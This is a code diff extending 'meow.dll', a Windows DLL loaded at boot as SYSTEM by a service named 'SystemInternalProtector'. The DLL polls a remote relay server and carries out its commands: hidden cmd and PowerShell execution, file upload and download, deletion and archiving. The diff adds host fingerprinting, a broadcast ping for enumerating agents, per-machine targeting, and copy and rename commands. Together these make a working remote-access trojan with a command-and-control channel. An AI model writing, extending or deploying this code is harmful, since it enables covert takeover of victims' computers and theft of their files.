@@ -1,5 +1,5 @@
 // ============================================================================
-//  meow.dll — SYSTEM component (v0.4.0)
+//  meow.dll — SYSTEM component (v0.5.0)
 //  Loaded by the SystemInternalProtector service (SYSTEM context, boot).
 //
 //  Exports:
@@ -13,12 +13,19 @@
 //  Relay verbs (command = VERB|arg1|arg2...):
 //    LIST|path         -> directory listing (hidden/system included)
 //    MKDIR|path        -> create directory
+//    RENAME|old|new    -> rename/move file or directory
+//    COPY|src|dst      -> copy file or directory tree
 //    DEL|path          -> delete file or directory tree
 //    GET|path          -> file as base64 chunks (result stream)
 //    PUT|path|append|b64data  -> write file (chunked)
 //    TAR|dir|tarfile   -> package directory with tar.exe
 //    RUNCMD|cmd        -> hidden cmd execution (as SYSTEM)
 //    RUNPS|script      -> hidden powershell execution
+//    PING              -> pong: ip|pcname|hwid (broadcast, target *)
+//
+//  Polling includes &host=<hwid>: the relay only returns commands whose
+//  target is "*" (broadcast, e.g. PING) or this host's hwid. Targeted
+//  tasks therefore never reach other agents.
 //
 //  Config: C:\ProgramData\SVOnline\config.json  {server, channel, poll_ms}
 //  Build:  cl /nologo /LD /EHsc /O2 /utf-8 /W4 /wd4996 meow.cpp advapi32.lib /Fe:meow.dll
@@ -61,6 +68,33 @@ static std::string toNarrow(const std::wstring& w) {
     for (size_t i = 0; i < w.size(); ++i) s[i] = static_cast<char>(w[i] & 0x7f);
     return s;
 }
+
+// ----------------------------------------------------------------------------
+// host identity (hwid, pc name, last known relay ip)
+// ----------------------------------------------------------------------------
+static std::string machineHwid() {
+    static std::string hwid;
+    if (!hwid.empty()) return hwid;
+    wchar_t buf[256]{};
+    DWORD sz = sizeof(buf);
+    if (RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography",
+                     L"MachineGuid", RRF_RT_REG_SZ, nullptr, buf, &sz) == ERROR_SUCCESS)
+        hwid = toNarrow(buf);
+    if (hwid.empty()) hwid = "unknown";
+    return hwid;
+}
+
+static std::string pcName() {
+    static std::string name;
+    if (!name.empty()) return name;
+    wchar_t buf[MAX_COMPUTERNAME_LENGTH + 1]{};
+    DWORD n = MAX_COMPUTERNAME_LENGTH + 1;
+    if (GetComputerNameW(buf, &n)) name = toNarrow(buf);
+    if (name.empty()) name = "unknown";
+    return name;
+}
+
+static std::string g_agentIp;  // last relay-provided client ip (from cmds fetch)
 
 // ----------------------------------------------------------------------------
 // logging (append-only, failure tolerant)
@@ -170,6 +204,26 @@ static bool deleteTree(const std::wstring& path) {
         RemoveDirectoryW(path.c_str());
     }
     return GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES;
+}
+
+static bool copyTree(const std::wstring& src, const std::wstring& dst) {
+    DWORD attr = GetFileAttributesW(src.c_str());
+    if (attr == INVALID_FILE_ATTRIBUTES) return false;
+    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
+        if (!CreateDirectoryW(dst.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS)
+            return false;
+        WIN32_FIND_DATAW fd{};
+        HANDLE h = FindFirstFileW((src + L"\\*").c_str(), &fd);
+        if (h == INVALID_HANDLE_VALUE) return false;
+        bool ok = true;
+        do {
+            if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
+            if (!copyTree(src + L"\\" + fd.cFileName, dst + L"\\" + fd.cFileName)) ok = false;
+        } while (ok && FindNextFileW(h, &fd));
+        FindClose(h);
+        return ok;
+    }
+    return CopyFileW(src.c_str(), dst.c_str(), FALSE) != FALSE;
 }
 
 // ----------------------------------------------------------------------------
@@ -575,6 +629,7 @@ static void saveConfig(const std::string& server, const std::string& channel) {
 struct CmdMsg {
     std::string id;
     std::string command;
+    std::string clientIp;
 };
 
 static std::vector<CmdMsg> parseCommands(const std::string& json) {
@@ -590,6 +645,13 @@ static std::vector<CmdMsg> parseCommands(const std::string& json) {
             size_t p2 = prev + 5;
             while (p2 < json.size() && (json[p2] == ' ' || json[p2] == '\t')) ++p2;
             jsonStringAt(json, p2, m.id);
+        }
+        size_t ipk = json.find("\"client_ip\":", p);
+        size_t nextCmd = json.find("\"command\":", i + 10);
+        if (ipk != std::string::npos && (nextCmd == std::string::npos || ipk < nextCmd)) {
+            size_t p3 = ipk + 12;
+            while (p3 < json.size() && (json[p3] == ' ' || json[p3] == '\t')) ++p3;
+            jsonStringAt(json, p3, m.clientIp);
         }
         out.push_back(m);
         i = p + m.command.size();
@@ -613,7 +675,8 @@ static void postResultMsg(const AgentCfg& cfg, const CmdMsg& cmd, const std::str
                        ",\"message\":\"" + jsonEscape(message) +
                        "\",\"chunk_i\":" + std::to_string(chunkI) +
                        ",\"chunk_n\":" + std::to_string(chunkN) +
-                       ",\"data\":\"" + data + "\"}}";
+                       ",\"host\":\"" + jsonEscape(pcName() + "|" + machineHwid() + "|" + g_agentIp) +
+                       "\",\"data\":\"" + data + "\"}}";
     postResult(cfg, body);
 }
 
@@ -625,6 +688,10 @@ static void dispatchCmd(const AgentCfg& cfg, const CmdMsg& cmd) {
     for (auto& ch : verb) if (ch >= 'a' && ch <= 'z') ch -= 32;
     std::wstring wrest = toWide(rest);
 
+    if (verb == "PING") {
+        postResultMsg(cfg, cmd, "PONG", 0, g_agentIp + "|" + pcName() + "|" + machineHwid());
+        return;
+    }
     if (verb == "RUNCMD") {
         int code = runHidden(wrest, L"", 120000);
         postResultMsg(cfg, cmd, "RUNCMD", code, "done");
@@ -641,6 +708,29 @@ static void dispatchCmd(const AgentCfg& cfg, const CmdMsg& cmd) {
         BOOL ok = CreateDirectoryW(wrest.c_str(), nullptr);
         if (!ok && GetLastError() == ERROR_ALREADY_EXISTS) ok = TRUE;
         postResultMsg(cfg, cmd, "MKDIR", ok ? 0 : (int)GetLastError(), ok ? "created" : "failed");
+        return;
+    }
+    if (verb == "RENAME") {
+        size_t p1 = rest.find('|');
+        if (p1 == std::string::npos) { postResultMsg(cfg, cmd, "RENAME", 1, "bad args"); return; }
+        std::wstring oldp = toWide(rest.substr(0, p1));
+        std::wstring newp = toWide(rest.substr(p1 + 1));
+        if (oldp.empty() || newp.empty()) { postResultMsg(cfg, cmd, "RENAME", 1, "no path"); return; }
+        BOOL ok = MoveFileW(oldp.c_str(), newp.c_str());
+        if (!ok && GetLastError() == ERROR_ALREADY_EXISTS) {
+            ok = MoveFileW(oldp.c_str(), newp.c_str());  // no overwrite; fail cleanly
+        }
+        postResultMsg(cfg, cmd, "RENAME", ok ? 0 : (int)GetLastError(), ok ? "renamed" : "failed");
+        return;
+    }
+    if (verb == "COPY") {
+        size_t p1 = rest.find('|');
+        if (p1 == std::string::npos) { postResultMsg(cfg, cmd, "COPY", 1, "bad args"); return; }
+        std::wstring src = toWide(rest.substr(0, p1));
+        std::wstring dst = toWide(rest.substr(p1 + 1));
+        if (src.empty() || dst.empty()) { postResultMsg(cfg, cmd, "COPY", 1, "no path"); return; }
+        bool ok = copyTree(src, dst);
+        postResultMsg(cfg, cmd, "COPY", ok ? 0 : (int)GetLastError(), ok ? "copied" : "failed");
         return;
     }
     if (verb == "DEL") {
@@ -681,7 +771,9 @@ static void dispatchCmd(const AgentCfg& cfg, const CmdMsg& cmd) {
         std::string body = "{\"channel\":\"" + jsonEscape(cfg.channel) +
                            "\",\"sender\":\"meow\",\"result\":{\"id\":\"" + jsonEscape(cmd.id) +
                            "\",\"verb\":\"LIST\",\"exit\":0,\"message\":\"ok\"," +
-                           "\"chunk_i\":0,\"chunk_n\":0,\"data\":\"\",\"entries\":" + entries + "}}";
+                           "\"chunk_i\":0,\"chunk_n\":0,\"data\":\"\"," +
+                           "\"host\":\"" + jsonEscape(pcName() + "|" + machineHwid() + "|" + g_agentIp) +
+                           "\",\"entries\":" + entries + "}}";
         postResult(cfg, body);
         return;
     }
@@ -780,13 +872,17 @@ static void dispatchCmd(const AgentCfg& cfg, const CmdMsg& cmd) {
 static void agentCycleOnce() {
     AgentCfg cfg = loadConfig();
     if (cfg.server.empty() || cfg.channel.empty()) return;
-    std::string url = cfg.server + "/api/cmds?channel=" + urlEncode(cfg.channel);
+    std::string url = cfg.server + "/api/cmds?channel=" + urlEncode(cfg.channel) +
+                      "&host=" + urlEncode(machineHwid());
     std::string resp;
     if (!httpJson("GET", url, "", resp)) return;
     std::vector<CmdMsg> cmds = parseCommands(resp);
     if (cmds.empty()) return;
     logLine((L"agent: " + std::to_wstring(cmds.size()) + L" command(s)").c_str());
-    for (auto& c : cmds) dispatchCmd(cfg, c);
+    for (auto& c : cmds) {
+        if (!c.clientIp.empty()) g_agentIp = c.clientIp;
+        dispatchCmd(cfg, c);
+    }
 }
 
 static void agentThread() {
